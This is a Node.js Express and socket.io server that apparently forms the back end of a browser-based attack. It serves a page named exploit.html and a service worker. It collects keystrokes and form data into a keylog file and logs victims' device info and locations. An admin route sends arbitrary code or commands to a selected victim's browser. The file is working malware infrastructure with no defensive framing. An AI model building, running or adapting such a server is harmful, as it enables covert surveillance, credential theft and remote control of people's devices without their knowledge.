const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*", methods: ["GET", "POST"] } });

const clients = {};

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Keylogger & form data collection
app.post('/collect', (req, res) => {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
        fs.appendFile('keylog.txt', body + '\n', () => {});
        res.status(200).end('OK');
    });
});

// Serve main page
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'exploit.html')));
app.get('/sw.js', (req, res) => res.sendFile(path.join(__dirname, 'public', 'sw.js')));

// Socket.io events
io.on('connection', socket => {
    clients[socket.id] = socket;
    socket.on('client-info', data => fs.appendFile('clients.log', JSON.stringify(data) + '\n', () => {}));
    socket.on('location', data => fs.appendFile('locations.log', JSON.stringify(data) + '\n', () => {}));
    socket.on('command-result', data => fs.appendFile('command_results.log', JSON.stringify(data) + '\n', () => {}));
    socket.on('disconnect', () => { delete clients[socket.id]; });
});

// Admin: send command to a client
app.post('/admin/command', (req, res) => {
    const { deviceId, type, code } = req.body;
    const target = Object.values(clients).find(s => s.deviceId === deviceId);
    if (target) target.emit('command', { type, code });
    res.status(200).end('SENT');
});

server.listen(3000, () => console.log('Server running on 3000'));
